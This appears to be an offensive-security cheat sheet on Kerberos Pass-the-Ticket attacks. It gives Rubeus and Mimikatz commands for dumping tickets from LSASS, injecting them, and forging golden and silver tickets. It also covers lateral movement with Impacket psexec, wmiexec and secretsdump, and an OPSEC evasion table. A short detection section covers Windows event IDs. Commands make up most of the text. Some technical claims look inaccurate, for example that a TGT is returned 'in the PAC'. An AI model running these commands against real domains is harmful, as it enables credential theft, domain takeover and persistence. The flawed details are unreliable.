# Pass-the-Ticket (PtT)

Pass-the-Ticket involves exporting a Kerberos TGT or service ticket from one machine and importing it on another. It allows an attacker to reuse authenticated Kerberos sessions without knowing the password or hash.

## How It Works

1. Kerberos tickets are cached in LSASS memory on Windows (`LogonSession` structures)
2. Tools extract the ticket data (TGT or TGS) as a `.kirbi` file or base64 blob
3. The ticket is imported into a different machine's KerberOS cache
4. The receiving machine presents the ticket to the DC/service for authentication
5. As long as the ticket is valid (not expired), the authentication succeeds

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges (extraction) | Local admin or SYSTEM (to access LSASS) |
| Privileges (injection) | Medium+ integrity (no admin needed for klist/import) |
| Ticket validity | TGTs last 10 hours by default; TGS up to 600 mins |
| Time sync | Clock skew <5 minutes between machines |
| SPN | Service tickets are specific to a service; TGTs are universal |

---

## Ticket Extraction

### Rubeus — Dump and Export Tickets

```
# Dump all cached tickets (kirbi format, no wrap)
Rubeus.exe dump /nowrap

# Dump tickets for specific user
Rubeus.exe dump /user:admin /nowrap

# Dump tickets for specific service
Rubeus.exe dump /service:krbtgt /nowrap

# Dump tickets by LUID
Rubeus.exe dump /luid:0x123456

# Dump and write to file
Rubeus.exe dump /outfile:tickets.kirbi

# Dump using /tgtdeleg flag (extracts TGT from current session)
Rubeus.exe tgtdeleg /nowrap

# With ceremony (extract all available tickets)
Rubeus.exe dump /ceremony
```

### Mimikatz — Export Tickets

```
# Export all cached tickets to current directory
mimikatz # sekurlsa::tickets /export

# Export tickets for specific user
mimikatz # sekurlsa::tickets /export /user:admin

# List tickets without exporting
mimikatz # kerberos::list

# List tickets from specific user
mimikatz # kerberos::list /user:admin

# List with detail
mimikatz # kerberos::list /export

# Export tickets from LSASS
mimikatz # sekurlsa::tickets
```

Exported files are named `[0x000000]-[XXXXX]-$USER@$SERVICE_DOMAIN.kirbi`.

### Mimikatz — Extract with Token

```
# List tokens to find the right one
mimikatz # token::list

# Use token to access tickets
mimikatz # token::run /id:1234 sekurlsa::tickets /export
```

---

## Ticket Injection

### Rubeus — Import Tickets (ptt)

```
# Import ticket from base64 string
Rubeus.exe ptt /ticket:BASE64_TICKET

# Import ticket from file
Rubeus.exe ptt /ticket:ticket.kirbi

# Import ticket with LUID targeting
Rubeus.exe ptt /ticket:BASE64 /luid:0x123456

# Import and restore (replaces current tickets)
Rubeus.exe ptt /ticket:BASE64 /restore

# Import all tickets from a file
Rubeus.exe ptt /tickets:tickets.txt
```

### Mimikatz — Import Tickets

```
# Import ticket from file
mimikatz # kerberos::ptt ticket.kirbi

# Import ticket with explicit LUID
mimikatz # kerberos::ptt ticket.kirbi /luid:0x123456

# Import after clearing existing tickets
mimikatz # kerberos::purge
mimikatz # kerberos::ptt ticket.kirbi
```

### PowerShell — Native Kerberos Manipulation

```powershell
# Load ticket from file and inject (requires module)
[System.IO.File]::ReadAllBytes('ticket.kirbi')

# Klist to list current tickets
klist

# Purge tickets
klist purge
```

---

## Ticket Renewal / Forge

### Rubeus — Renew Ticket

```
# Renew an existing TGT
Rubeus.exe renew /ticket:BASE64 /ptt

# Renew with specific target
Rubeus.exe renew /ticket:BASE64 /dc:dc01.domain.local /ptt
```

### Rubeus — Harvest TGT via /tgtdeleg

```
# Extract TGT via Kerberos delegation (no admin required)
Rubeus.exe tgtdeleg /nowrap

# TGT is output as base64, pipe to ptt
Rubeus.exe tgtdeleg | Rubeus.exe ptt
```

**OPSEC**: `/tgtdeleg` sends a TGS-REQ with a fake delegation S4U2proxy. The DC returns a TGT in the PAC. This does NOT require admin privileges — only network access.

---

## Golden / Silver Ticket

### Mimikatz — Golden Ticket

```
# Create golden ticket (krbtgt hash required)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_HASH /ptt

# With specific ID
mimikatz # kerberos::golden /user:Admin /domain:dom.local /sid:... /krbtgt:HASH /id:500 /ptt

# Without /ptt (export to file)
mimikatz # kerberos::golden /user:Admin /domain:dom.local /sid:... /krbtgt:HASH /ticket:golden.kirbi

# With SID history for enterprise admin
mimikatz # kerberos::golden /user:Admin /domain:dom.local /sid:... /sids:... /krbtgt:HASH /ptt

# With AES keys
mimikatz # kerberos::golden /user:Admin /domain:dom.local /sid:... /aes256:KEY /ptt
```

### Mimikatz — Silver Ticket

```
# Create silver ticket for CIFS (file shares)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:... /target:TARGET$ /rc4:SERVICE_HASH /service:cifs /ptt

# Silver for HOST (scheduled tasks, etc.)
mimikatz # kerberos::golden /user:Admin /domain:dom.local /sid:... /target:target$ /rc4:HASH /service:HOST /ptt

# Silver for HTTP (AD CS web enrollment, ECP)
mimikatz # kerberos::golden /user:admin /domain:dom.local /sid:... /target:target$ /rc4:HASH /service:HTTP /ptt

# Silver for LDAP (domain enumeration)
mimikatz # kerberos::golden /user:admin /domain:dom.local /sid:... /target:dc01$ /rc4:HASH /service:LDAP /ptt

# Silver for WinRM
mimikatz # kerberos::golden /user:admin /domain:dom.local /sid:... /target:target$ /rc4:HASH /service:WSMAN /ptt
```

### Rubeus — Silver Ticket

```
# Create silver ticket
Rubeus.exe silver /service:cifs/target.domain.local /rc4:HASH /user:admin /domain:domain.local /sid:S-1-5-21-... /ptt

# Create golden ticket
Rubeus.exe golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

---

## Using Tickets for Lateral Movement

Once a ticket is injected (via `/ptt` or `kerberos::ptt`), native Windows tools work transparently:

```
# Verify ticket is cached
klist

# Access a share
dir \\target\c$

# Execute remote commands via WinRM
Enter-PSSession -ComputerName target

# Execute via Schtasks
schtasks /S target /U /P /TN "calc"

# WMI with Kerberos
Get-WmiObject -ComputerName target win32_process

# PowerShell remoting
Invoke-Command -ComputerName target -ScriptBlock { whoami }
```

### Impacket with ccache files

```
# Set environment variable to use saved ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Convert .kirbi to .ccache if needed
ticketConverter.py ticket.kirbi ticket.ccache

# Use with Impacket tools
psexec.py domain.local/admin@target.domain.local -k -no-pass
wmiexec.py domain.local/admin@target.domain.local -k -no-pass
smbexec.py domain.local/admin@target.domain.local -k -no-pass

# Use with secretsdump
secretsdump.py -k domain.local/admin@target.domain.local -no-pass
```

---

## OPSEC Considerations

| Factor | Risk Level | Notes |
|--------|------------|-------|
| Ticket age | High | Old/expired tickets fail silently — check with `klist` |
| Ticket encryption | Medium | RC4 vs AES — AES is modern, RC4 may trigger alerts |
| Source IP mismatch | High | Ticket issued to one IP, used from another — anomalous |
| Service ticket scope | Medium | TGS only works for target service; TGT is universal |
| Golden ticket (krbtgt) | Critical | Uses domain KRBTGT account — full domain compromise |
| Silver ticket (service) | High | Requires target machine account hash |
| Extraction from LSASS | High | Requires admin; triggers EDR on LSASS access |
| klist anomalies | Low | Multiple TGTs per user, unusual ticket lifetimes (>10h) |

---

## Detection

| Event ID | Source | Description |
|----------|--------|-------------|
| 4624 | Target system | Logon with Kerberos (LogonType 3, 10) |
| 4768 | Domain Controller | TGT request (for TGT-based PtT) |
| 4769 | Domain Controller | TGS request (service ticket usage) |
| 4770 | Domain Controller | TGT renewal |
| 4672 | Target system | Admin logon with special privileges |
| 4688 | Target system | Process creation (Rubeus/Mimikatz) |
| 4104 | PowerShell | Script block logging (tool execution) |
| 5156 | Target system | Windows Filtering Platform connection |
| 1102 | System | Security log cleared (post-exploitation cleanup) |

**Detection logic**:
- Monitor Event ID 4769 for anomalous service ticket requests (unusual service, unusual source)
- Kerberos ticket usage from a machine that did not request the ticket (cross-check source IP in 4768 vs 4769)
- Multiple service ticket requests in short succession for different services by same user
- Golden ticket: detect via TGT lifetime > 10 hours (default) or unusual SIDs in the PAC
- Silver ticket: detect via missing PAC validation (DC does not validate service tickets)
- WinRM authentication with Kerberos tickets extracted from different machines

## When to Use Pass-the-Ticket

- **Already have admin access** on a machine with cached tickets (RDP session, Citrix, jump box)
- **User has existing Kerberos sessions** to other machines (common for admins with multiple open sessions)
- **Need to pivot** without touching LSASS again (tickets can be forwarded)
- **Krbtgt hash captured** (golden ticket — domain persistence and re-entry)
- **Service hash captured** (silver ticket — persistent access to specific machine)
- **After DCSync** — extract krbtgt hash, forge tickets for persistent DA access
- **Constrained delegation is configured** — harvest TGT via S4U delegation abuse
